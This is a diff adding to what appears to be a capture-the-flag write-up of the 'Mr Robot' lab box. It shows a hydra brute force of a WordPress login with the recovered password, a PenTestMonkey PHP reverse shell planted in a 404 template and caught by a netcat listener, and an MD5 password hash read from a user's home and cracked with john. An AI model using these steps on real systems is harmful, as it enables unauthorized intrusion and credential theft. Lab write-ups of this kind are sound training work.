@@ -106,4 +106,40 @@ http-post-form = the type of attack to perform
 
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log&testcookie=1:Invalid" = Path of webiste, POST body information, fail conditions (txt)
 
+Here we find a user name 'elliot' we can run hydra again with pretty much the same parameters and arguments, except this time we will change the -L to -l to indicate a single username to try and change -p to -P and define the same sorted list we used before
+
+        hydra -l elliot -P sorted.dic 10.10.175.151 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log&testcookie=1:incorrect"
+
+        [80][http-post-form] host: 10.10.175.151   login: elliot   password: ER28-0652
+
+Now that we have both a username and password let us login and figure out what we are dealing with
+
+We are working with wordpress verison 4.1.31 and we have access to edit the templates and themes for pages. From here we can upload the PenTestMonkey PHP script to a 404.php template page and then navigate to a nonexistant endpoint on the webserver to trigger the php script. Prior to triggering the script, we will start up our netcat listener on the port we defined in the pentestmonkey script
+
+        nc -lnvp 1337
+        
+                connect to [10.9.2.110] from (UNKNOWN) [10.10.175.151] 37713
+        Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+         14:25:35 up  1:16,  0 users,  load average: 0.00, 0.49, 2.53
+        USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+        uid=1(daemon) gid=1(daemon) groups=1(daemon)
+        sh: 0: can't access tty; job control turned off
+        $ 
+
+
+Once we navigate around a bit we find a user robot in the home directory with the second key that we cannot read with our current permissions, additionally there is a password.raw-md5 that we can read so lets grab that and bring it back to our attacker machine\
+
+        daemon@linux:/home/robot$ cat password.raw-md5
+        cat password.raw-md5
+        robot:c3fcd3d76192e4007dfb496cca67e13b
+        
+ Passing that hash into john we receive the following output:
+
+        ┌──(root💀kali)-[/home/kali/mrrobot]
+        └─# john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5                          1 ⨯
+        Using default input encoding: UTF-8
+        Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
+        Warning: no OpenMP support for this hash type, consider --fork=4
+        Press 'q' or Ctrl-C to abort, almost any other key for status
+        abcdefghijklmnopqrstuvwxyz (?)  
 
